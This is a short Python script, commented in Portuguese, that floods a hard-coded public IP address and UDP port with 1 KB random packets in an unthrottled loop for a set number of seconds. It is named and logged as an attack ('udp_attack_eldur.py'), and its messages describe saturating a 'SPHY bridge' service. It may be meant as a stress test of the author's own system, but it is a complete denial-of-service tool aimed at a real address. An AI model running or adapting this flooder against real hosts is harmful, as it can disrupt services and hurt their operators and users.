import socket
import random
import time
import sys

# CONFIGURAÇÃO DO ALVO - SPHY BRIDGE
TARGET_IP = "161.153.0.202"
TARGET_PORT = 1235
PACKET_SIZE = 1024 # 1KB por pacote (Ruído de Fase)

def iniciar_ataque_udp(duracao_segundos=30):
    print(f"--- [UDP PHASE STRESS - MODO SOBERANO] ---")
    print(f"Alvo: {TARGET_IP}:{TARGET_PORT} | Força Total (No Sleep)")
    
    # Criação do socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Pré-gera os bytes para não perder tempo de CPU no loop
    bytes_enviados = random._urandom(PACKET_SIZE)
    
    timeout = time.time() + duracao_segundos
    pacotes_count = 0
    
    print(">>> Disparando fluxo de entropia...")
    
    try:
        while True:
            # Checagem de tempo a cada 100 pacotes para ganhar performance
            if pacotes_count % 100 == 0:
                if time.time() > timeout:
                    break
            
            # Envio em força bruta
            sock.sendto(bytes_enviados, (TARGET_IP, TARGET_PORT))
            pacotes_count += 1
            
            if pacotes_count % 5000 == 0:
                print(f"[{time.time():.2f}] Pacotes: {pacotes_count} | Status: PRESSURIZANDO CAMPO...")
            
            # time.sleep REMOVIDO para saturação total da porta 1235
            
    except KeyboardInterrupt:
        print("\n--- [INTERRUPÇÃO] Ataque abortado pelo operador. ---")
    except Exception as e:
        print(f"\n[ERRO] Falha na ponte UDP: {e}")
    finally:
        print(f"\n--- [RESULTADO] Saturação Final: {pacotes_count} pacotes enviados. ---")
        print("Observe a barra PONTE UDP no Observer para a taxa de homeostase.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        try:
            duracao = int(sys.argv[1])
            iniciar_ataque_udp(duracao)
        except ValueError:
            print("Uso: python3 udp_attack_eldur.py [segundos]")
    else:
        iniciar_ataque_udp()
